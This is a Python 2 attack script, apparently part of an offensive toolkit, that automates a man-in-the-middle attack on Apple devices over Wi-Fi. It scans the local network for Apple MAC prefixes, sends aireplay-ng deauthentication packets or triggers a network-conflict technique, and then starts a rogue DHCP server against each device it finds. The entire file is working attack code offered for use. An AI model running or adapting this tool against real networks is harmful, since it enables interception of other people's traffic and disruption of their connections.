#!/usr/bin/env python

from base import Base
from os import path, errno
import subprocess as sub
from argparse import ArgumentParser
from sys import exit
from time import sleep

Base = Base()
Base.check_user()
Base.check_platform()
Base.print_banner()

parser = ArgumentParser(description='Apple WiFi DHCP MiTM creator')

parser.add_argument('-i', '--listen_iface', type=str, help='Set interface name for send DHCPACK packets')
parser.add_argument('-c', '--use_network_conflict', action='store_true', help='Use network conflict technique')
parser.add_argument('-r', '--aireplay_iface', type=str, help='Set interface name for aireplay')
parser.add_argument('-d', '--deauth', type=int, help='Set number of deauth packets (dafault=35)', default=35)

args = parser.parse_args()

number_of_deauth = str(args.deauth)
listen_network_interface = None
aireplay_network_interface = None
apple_devices = []

if args.listen_iface is None:
    print Base.c_warning + "Set listen network interface:"
    listen_network_interface = Base.netiface_selection()
else:
    listen_network_interface = args.listen_iface

if not args.use_network_conflict:
    if args.aireplay_iface is None:
        print Base.c_warning + "Set aireplay network interface:"
        aireplay_network_interface = Base.netiface_selection()
    else:
        aireplay_network_interface = args.aireplay_iface

    if aireplay_network_interface == listen_network_interface:
        print Base.c_error + "Network interface for listening and aireplay must be differ!"
        exit(1)

if __name__ == "__main__":
    print Base.c_info + "Listen network interface: " + Base.cINFO + listen_network_interface + Base.cEND
    if not args.use_network_conflict:
        print Base.c_info + "Aireplay network interface: " + Base.cINFO + aireplay_network_interface + Base.cEND

        bssid = None
        essid = None
        channel = None
        freq = None
        try:
            iwgetid = sub.Popen(['iwgetid -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
            essid, essid_err = iwgetid.communicate()
            iwgetid = sub.Popen(['iwgetid -a -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
            bssid, bssid_err = iwgetid.communicate()
            iwgetid = sub.Popen(['iwgetid -c -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
            channel, channel_err = iwgetid.communicate()
            iwgetid = sub.Popen(['iwgetid -f -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
            freq, freq_err = iwgetid.communicate()

            essid = essid.rstrip()
            bssid = bssid.rstrip()
            channel = channel.rstrip()
            freq = freq.rstrip()

            if essid is None or essid == "":
                print Base.c_error + "Network interface: " + listen_network_interface + " not connected to AP!"
                exit(1)
        except OSError as e:
            if e.errno == errno.ENOENT:
                print Base.c_error + "Program: iwgetid is not installed!"
                exit(1)
            else:
                print Base.c_error + "Something else went wrong while trying to run `iwgetid`"
                exit(2)

        print Base.c_info + "ESSID interface " + listen_network_interface + ": " + Base.cINFO + essid + Base.cEND
        print Base.c_info + "BSSID interface " + listen_network_interface + ": " + Base.cINFO + bssid + Base.cEND
        print Base.c_info + "Channel interface " + listen_network_interface + ": " + Base.cINFO + channel + Base.cEND
        print Base.c_info + "Frequency interface " + listen_network_interface + ": " + Base.cINFO + freq + Base.cEND

        print Base.c_info + "Monitor mode for interface: " + aireplay_network_interface + " channel: " + channel + " ..."
        try:
            sleep(1)
            sub.Popen(['airmon-ng stop ' + aireplay_network_interface + 'mon'], shell=True, stdout=sub.PIPE)
            sleep(1)
            sub.Popen(['airmon-ng start ' + aireplay_network_interface + ' ' + channel], shell=True, stdout=sub.PIPE)
        except OSError as e:
            if e.errno == errno.ENOENT:
                print Base.c_error + "Program: iwconfig or ifconfig is not installed!"
                exit(1)
            else:
                print Base.c_error + "Something else went wrong while trying to run `iwconfig` or `ifconfig`"
                exit(2)

    script_dir = path.dirname(path.realpath(__file__))
    print Base.c_info + "ARP scan is running ..."
    arp_scan_out = None
    try:
        arp_scan = sub.Popen(['arp-scan --macfile=' + script_dir + '/apple_mac_prefixes.txt -I ' +
                               listen_network_interface + ' --localnet --ignoredups --retry=3 --timeout=3000'],
                             shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
        arp_scan_out, arp_scan_err = arp_scan.communicate()
    except OSError as e:
        if e.errno == errno.ENOENT:
            print Base.c_error + "Program: arp-scan is not installed!"
            exit(1)
        else:
            print Base.c_error + "Something else went wrong while trying to run `arp-scan`"
            exit(2)

    if arp_scan_out is not None:
        for device in arp_scan_out.splitlines():
            if "Apple" in device:
                apple_devices.append(device.split())
        if len(apple_devices) > 0:
            print Base.c_info + "Apple devices found:"
            for apple_device in apple_devices:
                print Base.c_success + apple_device[0] + " (" + apple_device[1] + ")"
            for apple_device in apple_devices:
                try:
                    if args.use_network_conflict:
                        sub.Popen(['python ' + script_dir + '/dhcp_rogue_server.py -i ' + listen_network_interface +
                                   ' -I ' + apple_device[0] + ' -t ' + apple_device[1] + ' -q &'],
                                  shell=True)
                        sub.Popen(['python ' + script_dir + '/network_conflict_creator.py -i ' +
                                   listen_network_interface + ' -I ' + apple_device[0] + ' -t ' + apple_device[1] +
                                   ' -p 2 -q'], shell=True)
                    else:
                        sub.Popen(['python ' + script_dir + '/dhcp_rogue_server.py -i ' + listen_network_interface +
                                   ' -I ' + apple_device[0] + ' -t ' + apple_device[1] + ' -q --apple &'],
                                  shell=True)
                except OSError as e:

                    if e.errno == errno.ENOENT:
                        print Base.c_error + "Program: python is not installed!"
                        exit(1)
                    else:
                        print Base.c_error + "Something else went wrong while trying to run `dhcp_rogue_server.py`"
                        exit(2)

                if not args.use_network_conflict:
                    print Base.c_info + "Send " + number_of_deauth + " deauth packets to: " + apple_device[1]
                    print Base.c_info + 'Command: aireplay-ng ' + aireplay_network_interface + 'mon -0 ' + \
                          number_of_deauth + ' -a ' + bssid + ' -c ' + apple_device[1] + ' &'
                    try:
                        aireplay_err = ""
                        aireplay = sub.Popen(['aireplay-ng ' + aireplay_network_interface + 'mon -0 ' + number_of_deauth +
                                             ' -a ' + bssid + ' -c ' + apple_device[1] + ' &'],
                                             shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
                        aireplay_out, aireplay_err = aireplay.communicate()

                        if aireplay_err != "":
                            print Base.c_error + "Aireplay error: "
                            print aireplay_err
                            exit(1)
                    except OSError as e:

                        if e.errno == errno.ENOENT:
                            print Base.c_error + "Program: aireplay-ng is not installed!"
                            exit(1)
                        else:
                            print Base.c_error + "Something else went wrong while trying to run `aireplay-ng`"
                            exit(2)
            try:
                rogue_server_is_run = True
                while rogue_server_is_run:
                    ps = sub.Popen(['ps aux | grep "dhcp_rogue_server" | grep -v grep'],
                                   shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
                    ps_out, ps_err = ps.communicate()
                    if ps_out == "":
                        rogue_server_is_run = False
                    else:
                        sleep(5)
            except OSError as e:

                if e.errno == errno.ENOENT:
                    print Base.c_error + "Program: ps is not installed!"
                    exit(1)
                else:
                    print Base.c_error + "Something else went wrong while trying to run `ps`"
                    exit(2)
        else:
            print Base.c_error + "Apple devices not found!"
    else:
        print Base.c_error + "Output of arp-scan is empty!"
